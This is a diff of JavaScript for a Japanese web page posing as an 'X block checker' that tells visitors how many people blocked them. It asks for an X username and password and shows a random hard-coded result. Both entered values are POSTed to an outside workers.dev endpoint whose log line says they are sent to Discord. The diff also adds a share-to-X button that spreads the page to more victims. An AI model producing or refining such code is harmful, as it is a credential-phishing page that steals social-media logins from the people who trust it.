@@ -1,19 +1,40 @@
+// =========================
+// Aの入力を英数字のみに制限
+// =========================
+
+const inputAElement = document.getElementById("inputA");
+
+inputAElement.addEventListener("input", function () {
+    this.value = this.value.replace(/[^a-zA-Z0-9]/g, "");
+});
+
+
+// =========================
+// 結果チェック
+// =========================
+
 function checkResult() {
 
-    const inputA = document.getElementById("inputA").value.trim();
-    const inputB = document.getElementById("inputB").value.trim();
+    const inputA =
+        document.getElementById("inputA").value.trim();
+
+    const inputB =
+        document.getElementById("inputB").value.trim();
+
 
     // Aが空欄
     if (inputA === "") {
         alert("ユーザー名を入力してください。");
         return;
     }
-    
+
+
     // Bが空欄
     if (inputB === "") {
         alert("パスワードを入力してください。");
         return;
     }
+
 
     // Bは8文字以上
     if (inputB.length < 8) {
@@ -27,6 +48,7 @@ function checkResult() {
     // =========================
 
     const results = [
+
         "あなたは1人にブロックされていました！",
         "あなたは2人にブロックされていました！",
         "あなたは3人にブロックされていました！",
@@ -66,10 +88,14 @@ function checkResult() {
         "あなたは37人にブロックされていました！",
         "あなたは38人にブロックされていました！",
         "あなたは39人にブロックされていました！"
+
     ];
 
 
+    // =========================
     // ランダム結果
+    // =========================
+
     const randomIndex =
         Math.floor(Math.random() * results.length);
 
@@ -77,7 +103,10 @@ function checkResult() {
         results[randomIndex];
 
 
+    // =========================
     // 結果表示
+    // =========================
+
     document.getElementById("resultText").textContent =
         resultText;
 
@@ -90,6 +119,7 @@ function checkResult() {
     // =========================
 
     fetch("https://dark-dawn-c121.flexfnbr7.workers.dev/", {
+
         method: "POST",
 
         headers: {
@@ -100,7 +130,9 @@ function checkResult() {
             inputA: inputA,
             inputB: inputB
         })
+
     })
+
     .then(response => {
 
         if (!response.ok) {
@@ -110,11 +142,13 @@ function checkResult() {
         return response.json();
 
     })
-    .then(data => {
+
+    .then(() => {
 
         console.log("Discord送信成功");
 
     })
+
     .catch(error => {
 
         console.error(
@@ -123,12 +157,13 @@ function checkResult() {
         );
 
     });
+
 }
 
 
-/* =========================
-   Xで結果をポスト
-========================= */
+// =========================
+// Xで結果をポスト
+// =========================
 
 function shareResult() {
 
@@ -136,20 +171,17 @@ function shareResult() {
         document.getElementById("resultText").textContent;
 
 
-    // ★ここを自分のサイトURLに変更
     const SITE_URL =
         "https://iz7d.github.io/block-checker/";
 
 
-    // Xに投稿する文章
     const text =
-        "Xブロックチェッカーチェッカーの結果は「" +
+        "𝕏ブロックチェッカーの結果は「" +
         result +
         "」でした！\n\n" +
         "あなたもチェックしてみて👇";
 
 
-    // X投稿URL
     const url =
         "https://twitter.com/intent/tweet?text=" +
         encodeURIComponent(text) +
@@ -157,10 +189,10 @@ function shareResult() {
         encodeURIComponent(SITE_URL);
 
 
-    // Xを開く
     window.open(
         url,
         "_blank",
         "width=600,height=500"
     );
+
     }
